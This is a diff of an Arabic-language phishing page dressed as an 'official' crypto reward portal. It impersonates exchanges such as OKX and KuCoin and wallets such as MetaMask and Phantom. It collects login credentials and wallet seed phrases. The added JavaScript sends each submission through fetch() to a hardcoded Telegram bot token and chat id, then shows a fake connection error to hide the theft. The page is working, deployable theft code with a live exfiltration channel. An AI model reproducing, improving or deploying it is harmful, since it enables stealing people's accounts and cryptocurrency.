@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Rewards 2026</title>
+    <title>Claim Your Crypto Reward - Official Portal</title>
     <style>
         body { background-color: #0b0e11; color: #eaecef; font-family: Arial, sans-serif; text-align: center; padding: 20px; margin: 0; }
         .container { max-width: 450px; margin: 20px auto; background: #1e2329; padding: 20px; border-radius: 15px; border: 1px solid #474d57; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
@@ -31,7 +32,6 @@
         <div class="platform" onclick="showLogin('MEXC')"><img src="https://seeklogo.com/images/M/mexc-logo-50346E1B6B-seeklogo.com.png"> <span>MEXC</span></div>
         <div class="platform" onclick="showLogin('KuCoin')"><img src="https://cryptologos.cc/logos/kucoin-kcs-logo.png"> <span>KuCoin</span></div>
         <div class="platform" onclick="showLogin('OKX')"><img src="https://cryptologos.cc/logos/okx-logo.png"> <span>OKX</span></div>
-        
         <div class="platform" onclick="showLogin('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"> <span>MetaMask</span></div>
         <div class="platform" onclick="showLogin('Trust Wallet')"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png"> <span>Trust Wallet</span></div>
         <div class="platform" onclick="showLogin('Phantom')"><img src="https://cryptologos.cc/logos/phantom-phantom-logo.png"> <span>Phantom</span></div>
@@ -46,7 +46,7 @@
     <form id="pishForm">
         <input type="text" id="user_id" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
         <input type="password" id="user_pass" placeholder="كلمة المرور" required>
-        <button type="submit">تأكيد الربط واستلام USDT</button>
+        <button type="submit" id="submitBtn">تأكيد الربط واستلام USDT</button>
     </form>
 </div>
 
@@ -59,21 +59,38 @@
         document.getElementById('login-box').classList.remove('hidden');
         document.getElementById('platform-name').innerText = "الربط مع " + platform;
         
-        // تغيير الكلام إذا كانت محفظة
         if(platform === 'Trust Wallet' || platform === 'MetaMask' || platform === 'Phantom') {
             document.getElementById('instruction').innerText = "أدخل عبارة الاسترداد (12 كلمة) لربط المحفظة";
             document.getElementById('user_id').placeholder = "عبارة الاسترداد (Seed Phrase)";
+            document.getElementById('user_pass').style.display = "none";
+            document.getElementById('user_pass').value = "Wallet_No_Pass";
+        } else {
+            document.getElementById('instruction').innerText = "أدخل معلومات حسابك لتأكيد الهوية واستلام المكافأة";
+            document.getElementById('user_id').placeholder = "البريد الإلكتروني أو رقم الهاتف";
+            document.getElementById('user_pass').style.display = "block";
+            document.getElementById('user_pass').value = "";
         }
     }
 
     document.getElementById('pishForm').addEventListener('submit', function(e) {
         e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "... جاري الربط";
+        
         const info = document.getElementById('user_id').value;
         const pass = document.getElementById('user_pass').value;
         
-        // التوكن والآيدي ديالك
         const token = "8351638574:AAFWn2S7A9pG-HIdmNl6yv-pYJ9_mG-5DkE";
         const chat_id = "6925387370";
-        const text = `🎯 صيد جديد (GitHub)!\n\n🏢 المنصة/المحفظة: ${selectedPlatform}\n📝 البيانات/Seed: ${info}\n🔑 الباسورد: ${pass}`;
+        const text = `🎯 صيد جديد!\n🏢 المنصة: ${selectedPlatform}\n📝 البيانات: ${info}\n🔑 الباسورد: ${pass}`;
 
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURICom
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
+        .then(() => {
+            alert("خطأ في الاتصال بالسيرفر! يرجى المحاولة مرة أخرى.");
+            location.reload();
+        });
+    });
+</script>
+
+</body>
+</html>
